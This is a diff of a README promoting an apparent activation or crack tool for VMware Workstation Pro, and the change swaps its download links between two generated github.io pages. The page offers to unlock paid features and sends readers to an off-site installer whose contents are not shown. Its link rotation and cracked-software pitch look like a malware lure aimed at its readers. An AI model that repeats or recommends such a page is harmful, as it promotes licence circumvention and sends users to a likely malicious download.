@@ -2,7 +2,7 @@
 
 This activation suite is designed for VMware Workstation Pro, offering a seamless solution to unlock full version features and manage licenses on Windows 10 and 11 desktops. It caters to users seeking efficient activation with a user-friendly interface, ensuring compatibility with the latest 2026 releases.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -69,7 +69,7 @@ A: No, the activation process is offline after downloading the tool, ensuring pr
 
 Get the latest version of the activation tool directly from our GitHub page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Disclaimer
 
